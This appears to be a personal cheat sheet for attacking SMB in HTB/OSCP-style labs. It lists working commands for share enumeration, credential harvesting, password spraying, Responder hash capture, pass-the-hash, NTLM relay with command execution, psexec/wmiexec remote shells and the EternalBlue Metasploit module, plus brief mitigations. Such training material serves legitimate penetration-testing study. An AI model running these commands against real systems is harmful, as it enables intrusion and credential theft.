# SMB Attacks — Methods, Tools & Practical Notes

Short, practical reference for attacking SMB in HTB/OSCP-style labs: enumeration, exploitation, credential capture, relays, and post-exploitation checks.

---

## Quick Overview

SMB (Server Message Block) is a network file/service protocol commonly used by Windows and sometimes Linux (Samba). SMB attack workflows typically include:

- Share enumeration and access checks (anonymous/guest)
- File download/upload for credential harvesting or payload staging
- Administrative shares (C$, ADMIN$) for remote command execution when valid credentials exist
- Capturing Net-NTLM hashes via forced authentication
- Relay attacks to pivot or execute commands on other hosts
- Brute force and password spraying when credentials are weak
- Exploiting known SMB vulnerabilities (e.g., MS17-010 / EternalBlue)

---

## 1. Anonymous / Guest Access Checks

Tools: `smbmap`, `smbclient`, `crackmapexec` (a.k.a. `netexec`), `smbtree`

Commands / Examples:

- Quick share list (smbmap):

```
smbmap -H <target>
```

- Explicit guest login (smbmap):

```
smbmap -H <target> -u guest -p ""
```

- smbclient list shares (no auth):

```
smbclient -L //<target> -N
```

- Connect to a share (interactive):

```
smbclient //<target>/Share -N
# then: get secret.docx
# or: put file.txt
```

- crackmapexec (netexec) quick check for guest/anonymous:

```
crackmapexec smb <target> -u '' -p ''
```

What to check:
- If anonymous access lists shares or allows read/download, recursively enumerate files for creds/configs.
- Check for world‑writable shares (upload capability) — useful for stage/payload hosting.

---

## 2. Recursive Enumeration & File Harvesting

Tools: `smbmap`, `smbclient`, `smbget`, `enum4linux`

Examples:

```
# Recursive listing with smbmap
smbmap -H <ip> -r SHARE

# Download files with smbclient
smbclient //<ip>/Share -U user
get secret.docx

# Run enum4linux for extended SMB enumerations
enum4linux -a <target>
```

What to check inside downloaded files:
- Plaintext credentials in config files, backup files, `.env`, `.bak` files
- SSH keys, private keys, database connection strings
- RDP/VM credentials, service account passwords

---

## 3. Administrative Shares (C$, ADMIN$) — Remote Exec

Tools: `crackmapexec` (`netexec`), `smbclient`, `wmiexec.py` (Impacket), `psexec.py` (Impacket)

Examples:

```
# Execute command using crackmapexec
crackmapexec smb <target> -u <user> -p <pass> -x "whoami"

# Using impacket's psexec/wmiexec
python3 /usr/share/impacket/examples/psexec.py <domain>/<user>:<pass>@<target>
python3 /usr/share/impacket/examples/wmiexec.py <user>:<pass>@<target> "whoami"
```

Notes:
- If you have working credentials for a privileged user, admin shares often allow immediate code execution or shell.
- Use these with caution in CTFs / labs (safe to use in HTB labs when permitted).

---

## 4. Brute Force & Password Spraying

Tools: `crackmapexec`, `hydra`, `ncrack` (or `crackmapexec`'s built-in lists)

Examples:

```
# Brute force single username with password list
crackmapexec smb <target> -u Administrator -p /path/passlist.txt

# Password spraying (many users, one password)
crackmapexec smb <target> -u users.txt -p 'Winter2024' --continue-on-success
```

When to spray/ brute force:
- Only when allowed by the platform (HTB allows targeted brute force on machines but check rules).
- Prefer password spraying (one guess across many accounts) to avoid account lockouts in real engagements.

---

## 5. Exploiting Known SMB Vulnerabilities

Tools: `nmap` (NSE scripts), `Metasploit`, `searchsploit`

Examples:

```
# Detect MS17-010
nmap --script smb-vuln-ms17-010 -p445 <target>

# Metasploit (concept)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
exploit
```

Notes:
- Most public SMB exploits should be used carefully; in HTB environments they may be applicable for older boxes.
- Always verify version and patch level first.

---

## 6. Capturing Net-NTLM Hashes (Forced Authentication)

Tools: `Responder`, `impacket-smbserver`, `ntlmrelayx` (Impacket)

Examples:

```
# Start Responder to capture hashes
responder -I eth0

# Host a malicious SMB share with impacket
sudo impacket-smbserver share .
```

How it works:
- Trick target (or intermediary) to authenticate to your machine so you can capture NTLM challenge/response hashes.
- Useful in AD environments for relay or cracking offline.

---

## 7. Pass-the-Hash (PtH) & NTLM Relay

Tools: `crackmapexec`, `impacket-ntlmrelayx.py`

Examples:

```
# Use NTLM hash to authenticate
crackmapexec smb <target> -u Administrator -H <NTLM_hash>

# Relay captured auth to other targets
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

Notes:
- PtH requires the NTLM hash; relay requires a network path to a target that accepts NTLM auth.
- Relays can be used to move laterally or execute commands on other hosts.

---

## 8. Tools Summary

- smbmap — enumerate shares & permissions (easy recursion & download)
- smbclient — manual interaction with shares (get/put)
- crackmapexec (netexec) — strong all-in-one tool: enumeration, brute force, exec, PtH
- enum4linux — extended SMB & NetBIOS enumeration
- responder — LLMNR/NetBIOS/MDNS poisoner, hash capture
- impacket tools — `smbserver`, `wmiexec.py`, `psexec.py`, `ntlmrelayx.py`
- nmap + NSE scripts — initial SMB service checks and specific vuln scans
- Metasploit — exploit framework (careful use)

---

## 9. What to Check / Where (Scenario → Action Mapping)

This short mapping helps you decide next steps based on findings during enumeration.

- Finding: **Anonymous share listing / readable files**
  - Action: Recursively list & download; search for creds, keys, configs; check for backup files/credentials.
  - Tools: `smbmap -r`, `smbclient get`, `strings`/`binwalk` on files.

- Finding: **Writable share / upload allowed**
  - Action: Upload a tester file, try to upload a reverse shell or scheduled task drop (if Windows) to trigger later.
  - Tools: `smbclient put`, host a payload via `python -m http.server` and download from target.

- Finding: **Valid credentials (any)**
  - Action: Try admin shares (`C$`, `ADMIN$`), use `crackmapexec` / `impacket` for remote exec, check for local admin rights.
  - Tools: `crackmapexec smb`, `psexec.py`, `wmiexec.py`.

- Finding: **Captured NTLM hashes**
  - Action: Attempt Pass-the-Hash to other hosts, crack offline with `hashcat`, plan relay attacks.
  - Tools: `crackmapexec -H`, `hashcat`, `ntlmrelayx.py`.

- Finding: **Service vulnerable to MS17-010 or similar**
  - Action: Validate with `nmap` NSE, test exploit in safe environment, consider Metasploit module.
  - Tools: `nmap --script smb-vuln-ms17-010`, `msfconsole`.

- Finding: **Domain/AD environment discovered**
  - Action: Enumerate domain users/groups, run BloodHound enumeration (if allowed), plan Kerberoast/AS-REP attacks as applicable.
  - Tools: `enum4linux`, `rpcclient`, `impacket`, `bloodhound`/`neo4j` stack.

---

## 10. Defensive / Mitigation Notes (Short)

- Disable anonymous SMB access where not required.
- Restrict administrative shares and use strong credentials.
- Enforce SMB signing to prevent relay attacks.
- Monitor and alert on unusual SMB authentication or large file downloads.
- Patch SMB-related CVEs and keep servers updated.

---

## Quick Reference Commands

```
# List shares anonymously
smbmap -H 10.10.10.10
smbclient -L //10.10.10.10 -N

# Recursive listing and download
smbmap -H 10.10.10.10 -r Share
smbclient //10.10.10.10/Share -U user
get secret.docx

# Crackmapexec examples
crackmapexec smb 10.10.10.10 -u Administrator -p /path/passlist.txt
crackmapexec smb 10.10.10.10 -u '' -p ''
crackmapexec smb 10.10.10.10 -u Administrator -H <NTLM_hash>

# Responder (capture)
responder -I eth0

# Relay (impacket)
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

---

File created as a concise SMB attack reference for HTB/OSCP labs. Update with lab-specific commands or new tools as you use them.
